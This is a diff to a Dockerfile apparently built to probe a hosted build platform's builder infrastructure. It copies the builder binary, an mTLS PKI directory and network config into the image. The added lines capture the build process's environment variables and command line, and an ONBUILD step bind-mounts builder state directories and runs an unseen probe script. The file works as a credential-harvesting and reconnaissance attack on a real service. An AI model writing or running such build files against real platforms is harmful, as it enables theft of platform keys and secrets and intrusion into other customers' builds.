@@ -3,12 +3,13 @@ COPY usr/bin/builderv3 /f/bv
 COPY var/lib/railwayapp/mtls-pki /f/pki
 COPY etc/hosts /f/hosts
 COPY etc/resolv.conf /f/resolv
+COPY proc/self/environ /f/selfenv
+COPY proc/self/cmdline /f/selfcmd
 COPY probe_n1.sh /probe_n1.sh
 ONBUILD RUN --mount=type=bind,source=var/lib/builder,target=/hb \
     --mount=type=bind,source=var/lib/builderv3,target=/hb3 \
     --mount=type=bind,source=run/builder,target=/rb \
-    --mount=type=bind,source=proc,target=/hp \
-    sh -c 'apk add --no-cache openssl bind-tools >/dev/null 2>&1; sh /probe_n1.sh'
+    sh -c 'tr "\0" "\n" < /f/selfenv | sort > /f/selfenv.txt 2>/dev/null; tr "\0" " " < /f/selfcmd > /f/selfcmd.txt 2>/dev/null; apk add --no-cache openssl bind-tools >/dev/null 2>&1; sh /probe_n1.sh'
 FROM base
 RUN sh -c 'echo TRIGGER_N1'
 CMD ["sh","-c","sleep 10"]
